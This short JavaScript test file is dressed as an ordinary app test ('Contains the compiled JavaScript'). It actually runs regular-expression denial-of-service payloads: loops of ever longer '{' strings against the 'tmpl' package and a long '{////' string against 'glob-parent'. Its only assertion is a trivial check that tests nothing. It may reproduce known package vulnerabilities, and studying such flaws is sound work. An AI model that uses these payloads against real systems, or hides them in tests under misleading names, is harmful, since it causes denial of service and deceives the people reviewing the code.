function buildAttack (n) {
  let ret = '{'
  for (let i = 0; i < n; i++) {
    ret += '/'
  }
  return ret
}
const tmpl = require('tmpl')
const globParent = require('glob-parent')
describe('App', () => {
  it('Contains the compiled JavaScript', async () => {
    for(var i = 1; i <= 50000; i++) {
       var time = Date.now();
       var attack_str = ''+'{'.repeat(i*10000)+'answer';
        tmpl(attack_str, { answer: 42 })
       var time_cost = Date.now() - time;
       console.log('attack_str.length: ' + attack_str.length + ': ' + time_cost+' ms')
    }
    globParent(buildAttack(5000))
    const data = 'data'
    expect(data).toBe('data')
  })
})
